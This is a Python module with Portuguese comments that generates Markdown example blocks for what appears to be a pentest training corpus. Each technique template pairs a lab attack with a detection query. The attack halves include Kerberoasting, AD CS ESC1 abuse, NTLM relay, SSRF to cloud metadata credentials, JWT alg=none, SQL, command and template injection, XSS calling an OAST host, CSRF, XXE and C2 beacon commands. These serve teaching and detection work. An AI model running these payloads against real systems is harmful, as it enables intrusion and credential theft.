"""Banco de exemplos concretos (PoC lab / HTTP / CLI / query) por slug e categoria."""
from __future__ import annotations

import hashlib
import re

HEADERS = [
    "## Exemplo",
    "## PoC mínimo",
    "## No lab ficou assim",
    "## Sinal / query",
]


def _H(s: str) -> int:
    return int(hashlib.sha256(s.encode()).hexdigest()[:8], 16)


def _tag(row: dict, angle: str | None) -> str:
    key = f"{row['fid']}/{row['slug']}/{angle or 'base'}"
    return hashlib.sha256(key.encode()).hexdigest()[:6]


def _fence(lang: str, body: str) -> str:
    return f"```{lang}\n{body.rstrip()}\n```"


# (regex em fid/slug/label, lang_off, body_off, lang_det, body_det)
# Placeholders: {slug} {fid} {tag} {label} {obj} {port}
KEYWORD_EXAMPLES: list[tuple[str, str, str, str, str]] = [
    (
        r"ad-kerberoast/rc4|kerberoast.*rc4",
        "bash",
        "# lab.local — TGS RC4 só de SPN candidata (não assar a floresta)\n"
        "GetUserSPNs.py lab.local/USER_A:PASS_LAB -dc-ip DC01.lab.local \\\n"
        "  -request -outputfile tgs_{slug}_{tag}.kirbi\n"
        "# filtrar: service_etype == rc4_hmac  (0x17)",
        "kusto",
        "SecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == '0x17'\n| where ServiceName !startswith 'krbtgt'\n| where AccountName == 'USER_A'\n| project TimeGenerated, AccountName, ServiceName, ClientAddress, TicketEncryptionType\n// tag {tag}",
    ),
    (
        r"ad-kerberoast/(aes|asrep|gmsa|spn|honey|deleg|opsec|bloodhound|report)",
        "bash",
        "# Kerberoast lab — amostra mínima amarrada a {slug}\n"
        "GetUserSPNs.py lab.local/USER_A:PASS_LAB -dc-ip DC01.lab.local -request \\\n"
        "  -outputfile roast_{slug}_{tag}.kirbi\n"
        "# crack offline em hashcat mode 13100; sem dump massivo",
        "kusto",
        "SecurityEvent\n| where EventID in (4769, 4768)\n| where AccountName == 'USER_A'\n| summarize count() by ServiceName, TicketEncryptionType\n// hunting {slug} {tag}",
    ),
    (
        r"ad-cs/esc1",
        "bash",
        "# AD CS ESC1 — lab CA + template enrollee low-priv\n"
        "certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -stdout\n"
        "certipy req -u USER_A@lab.local -p PASS_LAB -ca LAB-CA \\\n"
        "  -template ESC1Lab -upn administrator@lab.local -out esc1_{tag}\n"
        "# evidencia: .pfx + auth LDAP como admin (conta teste)",
        "text",
        "Event 4886/4887 (CA) + 4768 com certificate logon\n"
        "filtro: Requester=USER_A Template=ESC1Lab RequestID={tag}\n"
        "alerta se SAN/UPN != identidade do enrollee",
    ),
    (
        r"ad-cs/esc",
        "bash",
        "# AD CS {slug} — enum + request mínimo no lab\n"
        "certipy find -u USER_A@lab.local -p PASS_LAB -dc-ip DC01.lab.local -vulnerable\n"
        "certipy req -u USER_A@lab.local -p PASS_LAB -ca LAB-CA -template TPL_{slug} -out {slug}_{tag}",
        "text",
        "CA audit: Event 4886/4887 template TPL_{slug}\n"
        "correlacionar enrollee USER_A com uso do cert (4768) — tag {tag}",
    ),
    (
        r"ad-dacl/(genericall|writedacl|dcsync|addmember|forcechange|writespn|gpo|ou|adminsdholder|shadowcred)",
        "bash",
        "# DACL {slug} — prova de ACE sem mudança destrutiva\n"
        "bloodyAD --host DC01.lab.local -d lab.local -u USER_A -p PASS_LAB \\\n"
        "  get object 'CN=TARGET_OBJ,OU=Lab,DC=lab,DC=local' --attr nTSecurityDescriptor\n"
        "# edge esperado: {slug} → conta teste; tag {tag}",
        "text",
        "Directory Service Changes + 4662 Object Access\n"
        "Object: TARGET_OBJ Properties alteradas por USER_A (lab)\n"
        "edge {slug} — correlacionar com BloodHound path tag {tag}",
    ),
    (
        r"web-idor/numeric|idor.*numeric",
        "http",
        "GET /api/v1/orders/10042 HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Cookie: session=USER_B\n"
        "# esperado: 403 — se 200 com dados de USER_A, BOLA\n"
        "# variante {slug} tag {tag}",
        "kusto",
        "AppRequests\n| where Url has '/api/v1/orders/'\n| where UserId == 'USER_B' and OwnerId == 'USER_A'\n| where ResultCode == 200\n| project TimeGenerated, Url, UserId, OwnerId\n// IDOR numeric {tag}",
    ),
    (
        r"web-idor/",
        "http",
        "GET /api/v1/resources/{obj} HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Authorization: Bearer TOKEN_USER_B\n"
        "# object_id de USER_A — se 200 com PII, BOLA ({slug})\n"
        "# tag {tag}",
        "text",
        "access_log: user=USER_B resource={obj} owner=USER_A status=200\n"
        "regra: deny quando subject != owner — tag {tag} ({slug})",
    ),
    (
        r"web-ssrf/imds|ssrf-imds",
        "http",
        "POST /export/fetch HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}\n'
        "# lab: resposta com role name = prova de SSRF→IMDS (sem exfiltrar secret)\n"
        "# tag {tag}",
        "kusto",
        "CloudAppEvents\n| where RequestURL has '169.254.169.254'\n| where Application == 'app.lab.local'\n| project TimeGenerated, RequestURL, AccountObjectId\n// SSRF IMDS {tag}",
    ),
    (
        r"web-ssrf/",
        "http",
        "POST /hook/preview HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"target":"http://internal-admin.lab.local:{port}/health"}}\n'
        "# SSRF {slug}: corpo/timing prova alcance interno — tag {tag}",
        "text",
        "egress_proxy deny link-local + RFC1918 não allowlisted\n"
        "log: src=app dst=internal-admin.lab.local action=ALLOW? → gap ({slug}/{tag})",
    ),
    (
        r"api-jwt/alg-none",
        "http",
        "GET /api/me HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJUSER_AIiwicm9sZSI6ImFkbWluIn0.\n"
        "# se 200 com role admin sem verify → alg=none aceito\n"
        "# tag {tag}",
        "kusto",
        "AppTraces\n| where Message has 'jwt' and Message has 'alg'\n| where Message has 'none' or Message has 'verify failed'\n| project TimeGenerated, Message\n// jwt alg-none {tag}",
    ),
    (
        r"api-jwt/",
        "http",
        "GET /api/v1/admin/users HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Authorization: Bearer JWT_{slug}_{tag}\n"
        "# claim tamper / kid / aud — ver variante {slug}",
        "text",
        "authz_fail OR jwt_verify_error claim={slug}\n"
        "alerta se alg in (none, HS256) com key pública — tag {tag}",
    ),
    (
        r"api-mass-assignment/",
        "http",
        "PATCH /api/v1/profile HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Cookie: session=USER_A\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"displayName":"lab","role":"admin","tenant_id":"TENANT_B"}}\n'
        "# mass-assign {slug}: GET depois e comparar role — tag {tag}",
        "text",
        "audit: user USER_A patched protected fields role/tenant_id\n"
        "expected deny — tag {tag} ({slug})",
    ),
    (
        r"api-graphql/",
        "http",
        "POST /graphql HTTP/1.1\n"
        "Host: api.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"query":"query {{ node(id:\\"{obj}\\") {{ ... on User {{ email role }} }} }}"}}\n'
        "# GraphQL {slug} — tag {tag}",
        "text",
        "graphql_complexity > budget OR node(id) cross-user 200\n"
        "variant {slug} tag {tag}",
    ),
    (
        r"auth-oauth|auth-mfa|auth-password",
        "http",
        "GET /oauth/authorize?client_id=APP_LAB&redirect_uri=https://evil.lab.local/cb&response_type=code&state={tag} HTTP/1.1\n"
        "Host: idp.lab.local\n"
        "# fluxo {slug}: capturar se redirect_uri fora do allowlist passa",
        "text",
        "Sign-in logs: unexpected redirect_uri OR MFA skipped for USER_A\n"
        "app=APP_LAB flow={slug} tag={tag}",
    ),
    (
        r"inj-sqli/",
        "http",
        "GET /items?id=1'+AND+1%3d1-- HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Cookie: session=USER_A\n"
        "# boolean mínimo {slug}; sem DROP — tag {tag}",
        "text",
        "db_audit: syntax error OR atypical query from app_user\n"
        "pattern {slug} tag {tag}",
    ),
    (
        r"inj-cmd/",
        "http",
        "POST /tools/ping HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/json\n"
        "\n"
        '{{"host":"127.0.0.1; id"}}\n'
        "# lab only — saída de id prova inj {slug} tag {tag}",
        "text",
        "process_create parent=app cmd contains '; id' OR unexpected shell\n"
        "{slug} {tag}",
    ),
    (
        r"inj-ssti/",
        "http",
        "POST /render HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: application/x-www-form-urlencoded\n"
        "\n"
        "name={{{{7*7}}}}\n"
        "# se ecoa 49 → SSTI {slug}; sem RCE destrutivo — tag {tag}",
        "text",
        "app_log template_eval OR unexpected expression result 49\n"
        "engine hint {slug} tag {tag}",
    ),
    (
        r"client-xss/",
        "html",
        "<!-- reflected/stored lab payload — sem persistir em prod -->\n"
        "<img src=x onerror=\"fetch('https://oast.lab.local/{tag}')\">\n"
        "<!-- sink {slug}: sessão USER_A / cookie flags -->",
        "text",
        "csp_report OR xss_filter OR unusual script-src violation\n"
        "page={slug} tag={tag}",
    ),
    (
        r"client-csrf/",
        "html",
        "<form action=\"https://app.lab.local/api/settings/email\" method=\"POST\">\n"
        "  <input name=\"email\" value=\"attacker_{tag}@lab.local\">\n"
        "</form>\n"
        "<script>document.forms[0].submit()</script>\n"
        "<!-- CSRF {slug}: state change com cookie USER_A -->",
        "text",
        "state-changing POST sem CSRF token / SameSite=None cross-site\n"
        "{slug} {tag}",
    ),
    (
        r"xxe-classic/",
        "xml",
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE r [\n"
        '  <!ENTITY xxe SYSTEM "file:///etc/hostname">\n'
        "]>\n"
        "<r>&xxe;</r>\n"
        "<!-- XXE {slug} lab read mínimo — tag {tag} -->",
        "text",
        "parser external entity resolved OR outbound to oast.lab.local\n"
        "{slug} {tag}",
    ),
    (
        r"net-llmnr|net-smb|petitpotam|relay",
        "bash",
        "# relay lab — segmento acordado, conta teste\n"
        "ntlmrelayx.py -t smb://TARGET.lab.local -smb2support --no-dump\n"
        "# trigger {slug}; evidência: auth USER_A + ação não destrutiva tag {tag}",
        "text",
        "Event 4624/4625 NTLM + unusual SourceWorkstation\n"
        "signing disabled on TARGET — {slug} {tag}",
    ),
    (
        r"win-privesc/|win-cred/",
        "powershell",
        "# lab Windows — enum sem LSASS dump em prod\n"
        "Get-Acl C:\\ServicePath\\svc.exe | Format-List\n"
        "sc.exe qc SVC_{slug}\n"
        "# writable + priv service = privesc path tag {tag}",
        "text",
        "Sysmon 1/7/11: service binary path change OR suspicious parent-child\n"
        "{slug} {tag}",
    ),
    (
        r"linux-privesc/",
        "bash",
        "# linux privesc lab\n"
        "find / -perm -4000 -type f 2>/dev/null | head\n"
        "sudo -l\n"
        "getcap -r / 2>/dev/null | head\n"
        "# foco {slug} tag {tag}",
        "text",
        "auditd: execve of SUID OR sudo unusual OR capset\n"
        "{slug} {tag}",
    ),
    (
        r"aws-privesc/|aws-s3/",
        "bash",
        "# AWS lab — identidade de teste, sem wipe\n"
        "aws sts get-caller-identity --profile lab_{tag}\n"
        "aws s3api get-bucket-policy --bucket lab-bucket-{slug} --profile lab_{tag}\n"
        "# effective perms {slug}",
        "text",
        "CloudTrail eventName like AssumeRole/PutBucketPolicy\n"
        "userIdentity.accessKeyId=ASIA_LAB_{tag} — {slug}",
    ),
    (
        r"azure-entra/",
        "bash",
        "# Entra lab — Graph read mínimo\n"
        "az login --service-principal -u APP_LAB -p PASS_LAB --tenant TENANT_LAB\n"
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me'\n"
        "# variante {slug} tag {tag}",
        "text",
        "AAD non-interactive sign-in + Consent / Add app role assignment\n"
        "{slug} {tag}",
    ),
    (
        r"k8s-escape/",
        "bash",
        "# k8s lab namespace\n"
        "kubectl -n lab-{tag} auth can-i --list --as=system:serviceaccount:lab:sa-{slug}\n"
        "kubectl -n lab-{tag} get secrets\n"
        "# prova RBAC excessivo {slug}",
        "text",
        "apiserver audit: get secrets OR create privileged pod\n"
        "sa=sa-{slug} ns=lab-{tag}",
    ),
    (
        r"mobile-android/|mobile-ios/",
        "bash",
        "# mobile lab build — sem store production\n"
        "adb shell am start -a android.intent.action.VIEW \\\n"
        "  -d 'app://lab/{slug}?token=TOKEN_LAB_{tag}'\n"
        "# deep link / exported → token sink",
        "text",
        "mobile_telemetry: exported component invoked with foreign token\n"
        "{slug} {tag}",
    ),
    (
        r"wifi-evil-twin/",
        "bash",
        "# RF lab — ROE por escrito, canal/área fixos\n"
        "hostapd ./lab_{slug}.conf  # SSID LAB-{tag}\n"
        "# capturar cred de USER_A em portal de teste; sem pulverizar o prédio",
        "text",
        "wireless IDS: unexpected AP BSSID spoofing LAB-{tag}\n"
        "assoc de conta teste USER_A — {slug}",
    ),
    (
        r"rt-c2/",
        "bash",
        "# C2 lab — kill-switch e janela\n"
        "curl -sk https://c2.lab.local/{slug}/beacon -H 'X-Session: {tag}'\n"
        "# só conta teste; sem persistência fora do ROE",
        "text",
        "proxy/DNS: periodic beacon to c2.lab.local path /{slug}/\n"
        "JA3/UA anomaly tag {tag}",
    ),
    (
        r"purple-detect/",
        "yaml",
        "title: Purple {slug}\n"
        "logsource:\n"
        "  product: windows\n"
        "detection:\n"
        "  selection:\n"
        "    EventID: 1\n"
        "    CommandLine|contains: '{tag}'\n"
        "  condition: selection\n"
        "# atomic {slug} — uma execução limpa",
        "kusto",
        "DeviceProcessEvents\n| where ProcessCommandLine has '{tag}'\n| project Timestamp, DeviceName, ProcessCommandLine\n// purple {slug}",
    ),
    (
        r"crypto-tls/",
        "bash",
        "# TLS no host real do app\n"
        "nmap --script ssl-enum-ciphers -p {port} TARGET.lab.local\n"
        "echo | openssl s_client -connect TARGET.lab.local:{port} -tls1_0 2>&1 | head\n"
        "# variante {slug} tag {tag}",
        "text",
        "tls_inspection: protocol<TLS1.2 OR weak cipher on TARGET:{port}\n"
        "{slug} {tag}",
    ),
    (
        r"report-quality/|method-scope/",
        "text",
        "finding_id: F-{tag}\n"
        "variant: {slug}\n"
        "repro: passos 1–n em lab.local com USER_A\n"
        "cleanup: reverter objeto {obj}; reteste path anexado\n"
        "cvss: environmental justificado (não só base)",
        "text",
        "checklist peer-review: ROE · PoC redigido · cleanup · MITRE\n"
        "nota {slug} tag {tag}",
    ),
    (
        r"recon-passive-dns/|recon-http|recon-osint",
        "bash",
        "# recon passivo autorizado\n"
        "curl -sS 'https://crt.sh/?q=%25.lab.local&output=json' | jq '.[].name_value' | sort -u\n"
        "# marcar dev-/staging- ; tag {tag} ({slug})",
        "text",
        "CT monitor: new SAN *.lab.local issued\n"
        "DNS NXDOMAIN spike for enum pattern — {slug} {tag}",
    ),
    (
        r"web-upload/",
        "http",
        "POST /upload HTTP/1.1\n"
        "Host: app.lab.local\n"
        "Content-Type: multipart/form-data; boundary=----{tag}\n"
        "\n"
        "------{tag}\n"
        'Content-Disposition: form-data; name="file"; filename="probe_{slug}.txt"\n'
        "Content-Type: text/plain\n"
        "\n"
        "lab-probe-{tag}\n"
        "------{tag}--\n"
        "# sem webshell em prod; só lab",
        "text",
        "upload_log: unexpected content-type OR path traversal filename\n"
        "{slug} {tag}",
    ),
]

# fallbacks por categoria: várias variantes (lang, body)
CAT_FALLBACKS: dict[str, list[tuple[str, str]]] = {
    "01-recon": [
        ("bash", "dig TXT lab.local +short\nwhois lab.local | head -20\n# recon {slug} tag {tag}"),
        ("bash", "curl -sI https://TARGET.lab.local | sed -n '1,20p'\n# fingerprint {slug} {tag}"),
    ],
    "02-web": [
        ("http", "GET /{slug}?id={obj} HTTP/1.1\nHost: app.lab.local\nCookie: session=USER_A\n# tag {tag}"),
        ("bash", "curl -sk 'https://app.lab.local/{slug}' -H 'Cookie: session=USER_A'\n# tag {tag}"),
    ],
    "03-api": [
        ("http", "GET /api/{slug} HTTP/1.1\nHost: api.lab.local\nAuthorization: Bearer TOKEN_USER_A\n# tag {tag}"),
        ("bash", "curl -sk https://api.lab.local/api/{slug} -H 'Authorization: Bearer TOKEN_USER_A'\n# {tag}"),
    ],
    "04-auth": [
        ("http", "POST /login HTTP/1.1\nHost: idp.lab.local\nContent-Type: application/json\n\n"
         '{{"user":"USER_A","password":"PASS_LAB","flow":"{slug}"}}\n# tag {tag}'),
        ("bash", "curl -sk -X POST https://idp.lab.local/login -d 'user=USER_A&pass=PASS_LAB'\n# {slug} {tag}"),
    ],
    "05-injection": [
        ("http", "GET /q?x=test_{tag} HTTP/1.1\nHost: app.lab.local\n# inject probe {slug}"),
        ("bash", "sqlmap -u 'https://app.lab.local/q?x=1' --batch --level=1 --technique=B -D lab --tables\n"
         "# só lab; tag {tag} ({slug})"),
    ],
    "06-client": [
        ("html", "<script>/* {slug} */ fetch('/api/me',{{credentials:'include'}}).then(r=>r.text()).then(console.log)</script>\n"
         "<!-- tag {tag} -->"),
        ("javascript", "// {slug}\nfetch('https://app.lab.local/api/settings', {{method:'POST', credentials:'include', body:'x={tag}'}})"),
    ],
    "07-ssrf-xxe": [
        ("http", "POST /parse HTTP/1.1\nHost: app.lab.local\nContent-Type: application/xml\n\n"
         "<r>{slug}-{tag}</r>"),
        ("bash", "curl -sk -X POST https://app.lab.local/fetch -d 'url=http://127.0.0.1:{port}/'\n# {slug} {tag}"),
    ],
    "08-network": [
        ("bash", "nxc smb TARGET.lab.local -u USER_A -p PASS_LAB --shares\n# {slug} {tag}"),
        ("bash", "nmap -p 445,139 TARGET.lab.local --script smb-security-mode\n# {slug} {tag}"),
    ],
    "09-ad": [
        ("bash", "ldapsearch -H ldap://DC01.lab.local -D 'USER_A@lab.local' -w PASS_LAB -b 'DC=lab,DC=local' '(sAMAccountName=USER_A)'\n# {slug} {tag}"),
        ("bash", "impacket-GetADUsers lab.local/USER_A:PASS_LAB -all -dc-ip DC01.lab.local | head\n# {slug} {tag}"),
    ],
    "10-windows": [
        ("powershell", "whoami /priv\nGet-Service | ? Status -eq Running | select -First 5\n# {slug} {tag}"),
        ("cmd", "icacls C:\\lab\\{slug}\nsc query\nREM tag {tag}"),
    ],
    "11-linux": [
        ("bash", "id; ls -l /usr/bin/sudo; cat /etc/sudoers.d/* 2>/dev/null\n# {slug} {tag}"),
        ("bash", "ls -la /var/run/docker.sock 2>/dev/null; find / -name '*{slug}*' 2>/dev/null | head\n# {tag}"),
    ],
    "12-aws": [
        ("bash", "aws iam get-user --profile lab_{tag}\naws s3 ls --profile lab_{tag}\n# {slug}"),
        ("bash", "aws logs filter-log-events --log-group-name /lab/{slug} --filter-pattern '{tag}' --profile lab"),
    ],
    "13-azure": [
        ("bash", "az ad signed-in-user show\naz role assignment list --assignee USER_A -o table\n# {slug} {tag}"),
        ("text", "Entra audit: activity={slug} initiatedBy=USER_A correlationId={tag}"),
    ],
    "14-k8s": [
        ("bash", "kubectl -n lab get sa,rolebinding\nkubectl -n lab auth can-i get secrets --as=system:serviceaccount:lab:default\n# {slug} {tag}"),
        ("yaml", "apiVersion: v1\nkind: Pod\nmetadata:\n  name: probe-{tag}\n  namespace: lab\nspec:\n  containers:\n  - name: c\n    image: busybox\n    command: ['sleep','3600']\n# {slug}"),
    ],
    "15-mobile": [
        ("bash", "frida -U -f app.lab.{slug} -l enumerate.js\n# build de teste tag {tag}"),
        ("text", "logcat | grep -i token\n# storage/deeplink {slug} {tag}"),
    ],
    "16-wireless": [
        ("bash", "iwlist wlan0 scan | grep -A2 LAB-{tag}\n# {slug} ROE RF"),
        ("text", "pcap filter: wlan_mgt.ssid == \"LAB-{tag}\" — {slug}"),
    ],
    "17-redteam": [
        ("bash", "# beacon lab only\ncurl -sk https://c2.lab.local/j/{slug} -H 'X-Id: {tag}'"),
        ("text", "timeline: T+0 foothold → T+1 {slug} → stop (kill-switch {tag})"),
    ],
    "18-evasion": [
        ("yaml", "title: detect-{slug}\ndetection:\n  selection:\n    CommandLine|contains: '{tag}'\n  condition: selection"),
        ("kusto", "DeviceEvents | where AdditionalFields has '{tag}' | take 10\n// {slug}"),
    ],
    "19-crypto": [
        ("bash", "testssl.sh --openssl-timeout 5 TARGET.lab.local:{port}\n# {slug} {tag}"),
        ("bash", "sslyze --regular TARGET.lab.local:{port} | tee tls_{slug}_{tag}.txt"),
    ],
    "20-report": [
        ("text", "ID: {tag}\nTítulo: {label}\nSeveridade: justificada\nPoC: redigido\nCleanup: feito\n# {slug}"),
        ("text", "reteste: passo A → B → falha esperada pós-fix ({slug}/{tag})"),
    ],
}

HARDEN_BODIES: list[tuple[str, str]] = [
    (
        "text",
        "antes: controle ausente para {slug}\n"
        "depois: ownership check / deny default em TARGET\n"
        "verificação: PoC {tag} retorna 403/blocked\n"
        "reteste USER_A vs USER_B",
    ),
    (
        "bash",
        "# verificação pós-hardening {slug}\n"
        "curl -sk -o /dev/null -w '%{{http_code}}\\n' https://app.lab.local/{slug}/{obj} \\\n"
        "  -H 'Cookie: session=USER_B'\n"
        "# esperado 403 — tag {tag}",
    ),
    (
        "text",
        "checklist {slug}:\n"
        "- [ ] controle preventivo ativo\n"
        "- [ ] telemetria cobre o PoC\n"
        "- [ ] reteste com mesma prova ({tag}) falha",
    ),
]

EVIDENCE_BODIES: list[tuple[str, str]] = [
    (
        "text",
        "--- evidência redigida ---\n"
        "req: GET /…/{obj} Cookie=USER_B\n"
        "res: 200 body_len=412 fields=[email,role]  # PII mascarada\n"
        "impacto: leitura cross-user ({slug})\n"
        "hash_prova: {tag}",
    ),
    (
        "http",
        "HTTP/1.1 200 OK\n"
        "Content-Type: application/json\n"
        "X-Request-Id: {tag}\n"
        "\n"
        '{{"id":"{obj}","owner":"USER_A","note":"redacted-{slug}"}}\n'
        "# capturado como USER_B",
    ),
]


def _fill(tpl: str, row: dict, angle: str | None) -> str:
    tag = _tag(row, angle)
    h = _H(f"{row['fid']}/{row['slug']}/{angle or 'base'}/ex")
    obj_opts = ["10042", "a1b2c3d4-e5f6-7890-abcd-ef1234567890", "ORD-7781", "usr_01HZX", f"obj_{tag}"]
    port_opts = ["8080", "8443", "443", "9000", "6443"]
    return tpl.format(
        slug=row["slug"],
        fid=row["fid"],
        tag=tag,
        label=row.get("label", row["slug"]),
        obj=obj_opts[h % len(obj_opts)],
        port=port_opts[(h // 3) % len(port_opts)],
    )


def _pick_keyword(row: dict) -> tuple[str, str, str, str] | None:
    blob = f"{row['fid']}/{row['slug']} {row.get('label','')}".lower()
    for pat, lo, bo, ld, bd in KEYWORD_EXAMPLES:
        if re.search(pat, blob, re.I):
            return lo, bo, ld, bd
    return None


def _header_for(row: dict, angle: str | None) -> str:
    h = _H(f"hdr/{row['fid']}/{row['slug']}/{angle or 'base'}")
    if angle == "detecção":
        return HEADERS[3] if h % 3 != 0 else HEADERS[h % 3]
    if angle in ("hardening", "evidência"):
        return HEADERS[h % 3]
    return HEADERS[h % 4]


def example_block(row: dict, angle: str | None = None) -> str:
    """Retorna seção markdown com exatamente um fence, único por fid/slug/angle."""
    header = _header_for(row, angle)
    h = _H(f"ex/{row['fid']}/{row['slug']}/{angle or 'base'}")
    kw = _pick_keyword(row)

    if angle == "detecção":
        if kw:
            lang, body = kw[2], kw[3]
        else:
            lang, body = "kusto", (
                "union isfuzzy=true SecurityEvent, DeviceProcessEvents\n"
                "| where TimeGenerated > ago(1h)\n"
                "| where AccountName == 'USER_A' or ProcessCommandLine has '{slug}'\n"
                "| take 20\n"
                "// detecção {slug} {tag}"
            )
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    if angle == "hardening":
        lang, body = HARDEN_BODIES[h % len(HARDEN_BODIES)]
        # prefer keyword offensive as "antes" reference? keep harden body but inject slug
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    if angle == "evidência":
        lang, body = EVIDENCE_BODIES[h % len(EVIDENCE_BODIES)]
        return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

    # base / lab / path — ofensivo mínimo
    if kw:
        lang, body = kw[0], kw[1]
    else:
        pool = CAT_FALLBACKS.get(row["cat"], CAT_FALLBACKS["02-web"])
        lang, body = pool[h % len(pool)]
    return f"{header}\n\n{_fence(lang, _fill(body, row, angle))}\n"

